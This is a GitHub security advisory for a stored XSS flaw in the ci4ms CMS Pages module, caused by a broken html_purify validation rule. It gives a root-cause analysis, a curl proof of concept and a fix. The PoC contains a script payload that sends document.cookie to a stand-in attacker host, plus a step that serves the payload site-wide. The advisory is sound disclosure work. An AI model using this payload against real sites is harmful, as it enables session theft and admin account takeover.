# [H] CI4MS: Stored XSS in Pages Module Content via Broken html_purify Validation Rule

## Summary
Severity: High
Advisory: GHSA-gqr2-7hcg-rchf
CVE: CVE-2026-45270
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-gqr2-7hcg-rchf
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.9.0

## Details
## Summary

The `Pages` backend module registers the `html_purify` validation rule on language-keyed page content but persists the raw, un-purified POST value into the database. The public renderer for pages (`Home::index()` → `app/Views/templates/default/pages.php`) emits `$pageInfo->content` without `esc()`, yielding stored XSS that fires for every public visitor of the affected page — including administrators. Because pages may be promoted to the site home page, the payload can be served at `/` and reach every visitor of the site.

## Details

This is a sibling-module variant of the same root cause as the Blog stored-XSS issue. The `html_purify` custom rule (`modules/Backend/Validation/CustomRules.php:54`) mutates its first argument by reference:

```php
public function html_purify(?string &$str = null, ?string &$error = null): bool
{
    ...
    $clean = self::sanitizeHtml($str);
    $str = $clean;
    self::$cleanCache[md5((string)$str)] = $clean;
    return true;
}
```

CodeIgniter 4's `Validation::processRules()` (`vendor/codeigniter4/framework/system/Validation/Validation.php:344`) invokes the rule as `$set->{$rule}($value, $error)` where `$value` is a local copy populated from request data. Even though the rule signature accepts `$str` by reference, the mutation only updates the local `$value` inside `processRules()`; the original POST array (and the request body) are never modified. To get the sanitized output, controllers must call `CustomRules::getClean(...)` after validation — but no controller in the codebase does so.

Pages controller — `modules/Pages/Controllers/Pages.php`:

- `Pages::create()` registers the rule at line 82:
  ```php
  'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required|html_purify'],
  ```
  Then at lines 102–113 it reads the raw POST and inserts it untouched:
  ```php
  $langsData = $this->request->getPost('lang') ?? [];
  ...
  $this->commonModel->create('pages_langs', [
      ...
      'content' => $lData['content'],   // line 111 — RAW
      ...
  ]);
  ```
- `Pages::update()` mirrors the same pattern at lines 130 and 157:
  ```php
  'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required|html_purify'],   // line 130
  ...
  'content' => $lData['content'],   // line 157 — RAW
  ```

The row lands in `pages_langs.content`, which is then read by the public-facing `Home::index()` controller (`app/Controllers/Home.php:31-76`) and emitted by the template at `app/Views/templates/default/pages.php:32`:

```php
<div id="ci4ms-content">
    <?php echo $pageInfo->content ?>     // no esc(), raw HTML output
</div>
```

`CommonLibrary::parseInTextFunctions()` (`app/Libraries/CommonLibrary.php:45`) is called on `$pageInfo->content` first, but only handles `{{form=...}}` / `{...|...}` shortcode-style replacement — it does no HTML sanitization.

This is distinct from the Blog finding:
- Different module/controller (`Modules\Pages\Controllers\Pages` vs `Modules\Blog\Controllers\Blog`)
- Different table (`pages_langs.content` vs `blog_langs.content`)
- Different view file (`templates/{theme}/pages.php` vs `templates/{theme}/blog/post.php`)
- Different route (`/<seflink>` matched by `Home::index` vs `/blog/<seflink>`)
- Pages can be promoted to the site home page via `Pages::setHomePage` (`modules/Pages/Controllers/Pages.php:206`), broadening blast radius beyond a single slug to every visitor of `/`.

Routes are confirmed protected by `backendGuard` for authentication (`modules/Pages/Config/PagesConfig.php:12-17`) and require `pages.create` / `pages.update` Shield permissions (`modules/Pages/Config/Routes.php:4-5`).

## PoC

Prerequisite: an account with the `pages.create` (or `pages.update`) permission. In ci4ms this is a non-admin content-author role.

Step 1 — log in to backend, capture cookies:
```bash
curl -k -c cookies.txt -b cookies.txt -X POST https://target/login \
  -d 'email=author@example.com' -d 'password=AuthorPass1!'
```

Step 2 — create a page with a malicious `content` payload:
```bash
curl -k -b cookies.txt -X POST https://target/backend/pages/create \
  -d 'lang[en][title]=POC' \
  -d 'lang[en][seflink]=poc-page-xss' \
  -d 'lang[en][content]=<script>fetch("https://attacker.example/?c="+encodeURIComponent(document.cookie))</script>' \
  -d 'isActive=1'
```

Expected: redirect to `/backend/pages/1` with `lang('Backend.created')` flashdata. The DB row `pages_langs.content` contains the literal `<script>...</script>` payload.

Step 3 — trigger the XSS by visiting the public URL:
```
https://target/poc-page-xss
```

`Home::index()` selects the row, `pages.php:32` emits the raw `<script>` tag, and the payload runs in every visitor's browser context. If a logged-in administrator browses the public site or follows a link to this slug, their backend session cookie is exfiltrated to `attacker.example`, enabling full account takeover.

Step 4 — broaden blast radius (optional, requires `pages.update`):
```bash
curl -k -b cookies.txt -X POST https://target/backend/pages/setHomePage/<page_id> \
  -H 'X-Requested-With: XMLHttpRequest'
```

After this, the malicious page is served at `/` to every visitor, including unauthenticated visitors and admins navigating to the front-end.

## Impact

- **Stored XSS in public-facing site:** any visitor to a malicious page slug — or to `/` if the page is set as home — executes the attacker's JavaScript.
- **Admin account takeover:** an authenticated admin who loads the public page (common during normal site review) leaks their Shield session cookie / CSRF token, enabling the attacker to ride the session against the entire `/backend/*` surface (full CMS administration, user management, file editor, backups, theme upload).
- **Privilege escalation:** the attacker only needs `pages.create` (a role typically delegated to non-admin content authors), but obtains code execution in the admin's browser, escaping the content-author security boundary into the admin's. This is the rationale for **S:C** in the CVSS vector.
- **Persistence and broad reach:** the payload is database-backed and survives until the row is edited or deleted; the home-page promotion converts a single-slug XSS into a site-wide drive-by.

## Recommended Fix

Stop relying on the broken reference-mutation pattern. The simplest, safest fix is to call the existing `sanitizeHtml` / `getClean` helper explicitly when persisting the content. In `modules/Pages/Controllers/Pages.php`:

```php
use Modules\Backend\Validation\CustomRules;

// Pages::create() — replace line 111
$this->commonModel->create('pages_langs', [
    'pages_id' => $insertID,
    'lang'     => $langCode,
    'title'    => strip_tags(trim($lData['title'])),
    'seflink'  => strip_tags(trim($lData['seflink'])),
    'content'  => CustomRules::sanitizeHtml((string)($lData['content'] ?? '')),
    'seo'      => $seoData
]);

// Pages::update() — replace line 157
$langUpdate = [
    'title'   => strip_tags(trim($lData['title'])),
    'seflink' => strip_tags(trim($lData['seflink'])),
    'content' => CustomRules::sanitizeHtml((string)($lData['content'] ?? '')),
    'seo'     => $seoData
];
```

Apply the same pattern in every other module that uses `html_purify` (Blog, etc.). For defense-in-depth, also escape on output for any field that is not intended to be raw HTML, and consider rewriting the `html_purify` rule to operate on `$data` so the validator stores the sanitized result via `getValidated()` rather than relying on a reference mutation that the framework discards.

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-gqr2-7hcg-rchf
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.9.0
